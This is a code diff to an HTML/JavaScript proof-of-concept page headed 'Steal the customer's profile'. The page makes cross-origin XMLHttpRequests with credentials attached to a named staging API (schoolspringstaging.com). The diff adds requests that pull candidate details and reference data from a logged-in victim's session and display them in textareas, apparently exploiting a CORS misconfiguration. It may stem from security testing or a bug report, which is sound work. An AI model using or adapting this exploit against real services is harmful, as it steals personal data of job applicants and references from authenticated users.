@@ -15,6 +15,8 @@ click the button to Steal the customer's profile!
 <div text="steal customer's profile">
 steal customer's profile
 <textarea id="customer" style="width: 200px; height: 150px;"></textarea>
+<textarea id="candidate" style="width: 200px; height: 150px;"></textarea>
+<textarea id="Reference" style="width: 200px; height: 150px;"></textarea>
 </div>
 </br>
 </br>
@@ -36,6 +38,34 @@ function stealprofile(){
 	    //若响应完成且请求成功
 	    if(xhr.readyState === 4 && xhr.status === 200){
 		document.getElementById("customer").innerHTML = xhr.responseText;
+		console.log("Success");
+	    }
+	}
+	var xhr1 = new XMLHttpRequest();
+        xhr1.open("GET", "https://api.schoolspringstaging.com/api/jobs/ats/Reference?domainName=", true);
+        xhr1.setRequestHeader("Accept", "*/*");
+        xhr1.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3");
+        xhr1.setRequestHeader("Content-Type", "application/json; charset=utf-8");
+        xhr1.withCredentials = true;
+        xhr1.send();
+ 	xhr1.onreadystatechange = function(){
+	    //若响应完成且请求成功
+	    if(xhr1.readyState === 4 && xhr1.status === 200){
+		document.getElementById("Reference").innerHTML = xhr1.responseText;
+		console.log("Success");
+	    }
+	}
+	var xhr2 = new XMLHttpRequest();
+        xhr2.open("GET", "https://api.schoolspringstaging.com/api/AtsCandidate/GetAtsCandidateDetails?domainName=", true);
+        xhr2.setRequestHeader("Accept", "*/*");
+        xhr2.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3");
+        xhr2.setRequestHeader("Content-Type", "application/json; charset=utf-8");
+        xhr2.withCredentials = true;
+        xhr2.send();
+ 	xhr2.onreadystatechange = function(){
+	    //若响应完成且请求成功
+	    if(xhr2.readyState === 4 && xhr2.status === 200){
+		document.getElementById("candidate").innerHTML = xhr2.responseText;
 		console.log("Success");
 	    }
 	}
